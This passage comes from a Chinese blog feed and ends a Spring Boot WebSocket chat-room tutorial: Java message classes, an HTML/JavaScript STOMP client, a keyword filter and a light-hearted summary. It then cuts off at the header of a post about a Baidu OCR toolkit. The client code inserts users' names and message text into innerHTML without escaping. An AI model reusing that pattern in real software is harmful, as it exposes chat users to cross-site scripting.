        <span class="hljs-comment">// 也发给自己，让自己看到发送的消息</span>
        <span class="hljs-selector-tag">messagingTemplate</span><span class="hljs-selector-class">.convertAndSendToUser</span>(
            chatMessage.<span class="hljs-built_in">getSender</span>(),
            <span class="hljs-string">"/queue/private"</span>,
            chatMessage
        );
    }
    
    <span class="hljs-comment">/**
     * 消息模型类 - 聊天的“语言规范”
     */</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">ChatMessage</span> {
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">MessageType</span> <span class="hljs-selector-tag">type</span>;      <span class="hljs-comment">// 消息类型</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">content</span>;        <span class="hljs-comment">// 消息内容</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">sender</span>;         <span class="hljs-comment">// 发送者</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">timestamp</span>;      <span class="hljs-comment">// 时间戳</span>
        
        <span class="hljs-comment">// 构造方法、getter、setter省略（但实际必须要有！）</span>
        <span class="hljs-comment">// 想象成：每个消息都要有信封、信纸、写信人、写信时间</span>
    }
    
    <span class="hljs-comment">/**
     * 消息类型枚举 - 聊天表情包分类
     */</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">enum</span> <span class="hljs-selector-tag">MessageType</span> {
        <span class="hljs-selector-tag">CHAT</span>,   <span class="hljs-comment">// 普通聊天</span>
        <span class="hljs-selector-tag">JOIN</span>,   <span class="hljs-comment">// 加入</span>
        <span class="hljs-selector-tag">LEAVE</span>   <span class="hljs-comment">// 离开</span>
    }
}
</code></pre>
<h3 data-id="heading-5">第4步：前端实现——用户的“聊天界面”</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- chat.html --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SpringBoot聊天室 - 禁止讨论为什么代码又报错<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Comic Sans MS'</span>, cursive; }
        <span class="hljs-selector-id">#chat-container</span> { 
            <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#4CAF50</span>; 
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#f5f7fa</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#c3cfe2</span> <span class="hljs-number">100%</span>);
        }
        <span class="hljs-selector-id">#message-area</span> {
            <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;
            <span class="hljs-attribute">overflow-y</span>: auto;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> dashed <span class="hljs-number">#ccc</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: white;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
        }
        <span class="hljs-selector-class">.message</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>; }
        <span class="hljs-selector-class">.my-message</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#e3f2fd</span>; <span class="hljs-attribute">text-align</span>: right; }
        <span class="hljs-selector-class">.their-message</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#f1f8e9</span>; }
        <span class="hljs-selector-class">.system-message</span> { 
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff3e0</span>; 
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">font-style</span>: italic;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff9800</span>;
        }
        <span class="hljs-selector-class">.join-message</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#4CAF50</span>; }
        <span class="hljs-selector-class">.leave-message</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#f44336</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chat-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>SpringBoot聊天室<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>当前状态：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>正在连接...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"connect-area"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"取个霸气的昵称"</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"connect()"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"connect-btn"</span>&gt;</span>进入聊天室<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chat-area"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message-area"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message-input"</span> 
                       <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"说点什么吧..."</span> 
                       <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 70%; padding: 10px;"</span>
                       <span class="hljs-attr">onkeypress</span>=<span class="hljs-string">"if(event.keyCode===13) sendMessage()"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendMessage()"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 10px;"</span>&gt;</span>发送<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 20px;"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"private-to"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"私聊对象昵称"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"private-message"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"悄悄话内容"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendPrivate()"</span>&gt;</span>发送悄悄话<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 引入WebSocket客户端库 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/webjars/sockjs-client/sockjs.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/webjars/stomp-websocket/stomp.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">let</span> stompClient = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">let</span> username = <span class="hljs-literal">null</span>;
        
        <span class="hljs-comment">// 连接WebSocket - 相当于“敲门”</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"/>) {
            username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'username'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            <span class="hljs-keyword">if</span> (!username) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">"请先取个昵称！不能叫'无名氏'吧？"</span>);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SockJS</span>(<span class="hljs-string">'/ws-chat'</span>);
            stompClient = <span class="hljs-title class_">Stomp</span>.<span class="hljs-title function_">over</span>(socket);
            
            stompClient.<span class="hljs-title function_">connect</span>({}, <span class="hljs-keyword">function</span>(<span class="hljs-params">frame</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"连接成功！服务器说："</span> + frame);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"已连接"</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'connect-area'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chat-area'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
                
                <span class="hljs-comment">// 订阅公共频道 - 相当于“坐在大厅听广播”</span>
                stompClient.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'/topic/public'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) {
                    <span class="hljs-title function_">showMessage</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-property">body</span>));
                });
                
                <span class="hljs-comment">// 订阅私人频道 - 相当于“戴上耳机听悄悄话”</span>
                stompClient.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'/user/queue/private'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) {
                    <span class="hljs-keyword">const</span> msg = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-property">body</span>);
                    msg.<span class="hljs-property">isPrivate</span> = <span class="hljs-literal">true</span>;
                    <span class="hljs-title function_">showMessage</span>(msg);
                });
                
                <span class="hljs-comment">// 发送加入消息</span>
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.addUser"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({<span class="hljs-attr">sender</span>: username, <span class="hljs-attr">type</span>: <span class="hljs-string">'JOIN'</span>})
                );
            }, <span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"连接失败："</span> + error);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"连接失败"</span>;
            });
        }
        
        <span class="hljs-comment">// 发送消息 - 相当于“对着话筒喊话”</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> messageInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'message-input'</span>);
            <span class="hljs-keyword">const</span> content = messageInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            
            <span class="hljs-keyword">if</span> (content &amp;&amp; stompClient) {
                <span class="hljs-keyword">const</span> chatMessage = {
                    <span class="hljs-attr">sender</span>: username,
                    <span class="hljs-attr">content</span>: content,
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'CHAT'</span>
                };
                
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.sendMessage"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(chatMessage)
                );
                messageInput.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
            }
        }
        
        <span class="hljs-comment">// 发送私聊</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendPrivate</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> toUser = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-to'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            <span class="hljs-keyword">const</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-message'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            
            <span class="hljs-keyword">if</span> (toUser &amp;&amp; content &amp;&amp; stompClient) {
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.private"</span>, {<span class="hljs-attr">to</span>: toUser}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                        <span class="hljs-attr">sender</span>: username,
                        <span class="hljs-attr">content</span>: content,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'CHAT'</span>
                    })
                );
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-message'</span>).<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
            }
        }
        
        <span class="hljs-comment">// 显示消息 - 相当于“把话写在聊天记录上”</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">showMessage</span>(<span class="hljs-params">message</span>) {
            <span class="hljs-keyword">const</span> messageArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'message-area'</span>);
            <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
            
            messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'message'</span>);
            
            <span class="hljs-comment">// 根据不同消息类型设置样式</span>
            <span class="hljs-keyword">if</span> (message.<span class="hljs-property">isPrivate</span>) {
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;<span class="hljs-subst">${message.sender}</span> 悄悄对你说：&lt;/strong&gt;
                    &lt;br/&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
                messageElement.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#fce4ec'</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">type</span> === <span class="hljs-string">'JOIN'</span>) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'system-message'</span>, <span class="hljs-string">'join-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`<span class="hljs-subst">${message.content}</span>`</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">type</span> === <span class="hljs-string">'LEAVE'</span>) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'system-message'</span>, <span class="hljs-string">'leave-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`<span class="hljs-subst">${message.content}</span>`</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">sender</span> === username) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'my-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;我：&lt;/strong&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
            } <span class="hljs-keyword">else</span> {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'their-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;<span class="hljs-subst">${message.sender}</span>：&lt;/strong&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
            }
            
            messageArea.<span class="hljs-title function_">appendChild</span>(messageElement);
            messageArea.<span class="hljs-property">scrollTop</span> = messageArea.<span class="hljs-property">scrollHeight</span>;
        }
        
        <span class="hljs-comment">// 页面关闭时发送离开消息</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (stompClient &amp;&amp; username) {
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.sendMessage"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                        <span class="hljs-attr">sender</span>: username,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'LEAVE'</span>,
                        <span class="hljs-attr">content</span>: <span class="hljs-string">''</span>
                    })
                );
            }
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">第5步：进阶功能——让聊天室更“炫酷”</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 在线用户管理</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatUserService</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">String</span>&gt; onlineUsers = <span class="hljs-title class_">ConcurrentHashMap</span>.<span class="hljs-title function_">newKeySet</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">userConnected</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        onlineUsers.<span class="hljs-title function_">add</span>(username);
        <span class="hljs-title function_">broadcastOnlineUsers</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">userDisconnected</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        onlineUsers.<span class="hljs-title function_">remove</span>(username);
        <span class="hljs-title function_">broadcastOnlineUsers</span>();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">broadcastOnlineUsers</span>(<span class="hljs-params"/>) {
        messagingTemplate.<span class="hljs-title function_">convertAndSend</span>(<span class="hljs-string">"/topic/onlineUsers"</span>, onlineUsers);
    }
}

<span class="hljs-comment">// 2. 消息持久化（保存聊天记录）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatMessageService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ChatMessageRepository</span> repository;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveMessage</span>(<span class="hljs-params">ChatMessage message</span>) {
        repository.<span class="hljs-title function_">save</span>(message);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"消息已保存到数据库，以后可以翻旧账了"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">ChatMessage</span>&gt; <span class="hljs-title function_">getRecentMessages</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> repository.<span class="hljs-title function_">findTop50ByOrderByTimestampDesc</span>();
    }
}

<span class="hljs-comment">// 3. 消息拦截器（敏感词过滤）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChannelInterceptor</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">String</span>[] sensitiveWords = {<span class="hljs-string">"密码"</span>, <span class="hljs-string">"银行卡"</span>, <span class="hljs-string">"V我50"</span>};
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Message</span>&lt;?&gt; <span class="hljs-title function_">preSend</span>(<span class="hljs-params">Message&lt;?&gt; message, MessageChannel channel</span>) {
        <span class="hljs-title class_">String</span> content = message.<span class="hljs-title function_">getPayload</span>().<span class="hljs-title function_">toString</span>();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">String</span> word : sensitiveWords) {
            <span class="hljs-keyword">if</span> (content.<span class="hljs-title function_">contains</span>(word)) {
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"检测到敏感词，消息已被吞掉"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 吞掉消息</span>
            }
        }
        
        <span class="hljs-keyword">return</span> message;
    }
}
</code></pre>
<h2 data-id="heading-7">三、总结：从“HTTP的尬聊”到“WebSocket的畅聊”</h2>
<h3 data-id="heading-8">WebSocket的优势：</h3>
<ol>
<li><strong>真正的双向通信</strong>：不再是“你问我答”，而是“畅所欲言”</li>
<li><strong>低延迟</strong>：消息实时到达，不用等HTTP的“快递员”来回跑</li>
<li><strong>减少带宽</strong>：一次握手，多次通信，省去了HTTP的“客套话”</li>
<li><strong>更少的服务器压力</strong>：不用维护成千上万的轮询请求</li>
</ol>
<h3 data-id="heading-9">SpringBoot集成WebSocket的核心思想：</h3>
<ol>
<li><strong>配置是骨架</strong>：<code>@EnableWebSocketMessageBroker</code> 是激活咒语</li>
<li><strong>控制器是大脑</strong>：<code>@MessageMapping</code> 指定消息接收点</li>
<li><strong>消息代理是广播站</strong>：<code>SimpleBroker</code> 负责消息分发</li>
<li><strong>STOMP是协议翻译官</strong>：把WebSocket的消息翻译成大家都能懂的语言</li>
</ol>
<h3 data-id="heading-10">开发心得：</h3>
<ol>
<li><strong>前端连接记住三步曲</strong>：SockJS创建连接 → Stomp封装协议 → 订阅/发送消息</li>
<li><strong>后端开发记住三注解</strong>：<code>@MessageMapping</code>（收信）、<code>@SendTo</code>（广播）、<code>@Payload</code>（取内容）</li>
<li><strong>生产环境要加料</strong>：认证、授权、SSL、集群支持、监控指标...</li>
</ol>
<h3 data-id="heading-11">最后：</h3>
<blockquote>
<p>从前，HTTP每次聊天都要重新握手，像极了社恐人士每次开口前都要心理建设半天。</p>
<p>现在，WebSocket一次握手终身连接，就像好哥们儿之间：“别废话，直接说！”</p>
<p>而SpringBoot就是那个贴心的管家，帮你把WebSocket的各种复杂配置都打包好，你只需要：</p>
<ol>
<li>加个依赖（点杯咖啡）</li>
<li>写个配置类（摆好桌椅）</li>
<li>写个控制器（找个主持人）</li>
<li>前端连一下（客人入场）</li>
</ol>
<p>然后就可以享受：<strong>高性能、低延迟、全双工的聊天体验</strong>！</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36753f9a28ae4a7ca6a32438d46276be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476114&amp;x-signature=fJCHZWBAal1tbI0w%2F9J3d2gjSt8%3D" alt="WebSocket：让HTTP的“尬聊”变成真正的“畅聊”.png" loading="lazy"/></p>
<p><strong>谢谢你看我的文章，既然看到这里了，如果觉得不错，随手点个赞、转发、在看三连吧，感谢感谢。那我们，下次再见。</strong></p>
<p>您的一键三连，是我更新的最大动力，谢谢</p>
<p>山水有相逢，来日皆可期，谢谢阅读，我们再会</p>
<p>我手中的金箍棒，上能通天，下能探海</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[百度开源，一个强大、轻量级的 OCR 工具包（附源码）]]></title>    <link>https://juejin.cn/post/7596905015367794688</link>    <guid>https://juejin.cn/post/7596905015367794688</guid>    <pubDate>2026-01-20T01:37:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367794688" data-draft-id="7596962772143996943" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="百度开源，一个强大、轻量级的 OCR 工具包（附源码）"/> <meta itemprop="keywords" content="后端,百度,百度飞桨"/> <meta itemprop="datePublished" content="2026-01-20T01:37:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悟空码字"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            百度开源，一个强大、轻量级的 OCR 工具包（附源码）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悟空码字
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:37:00.000Z" title="Tue Jan 20 2026 01:37:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
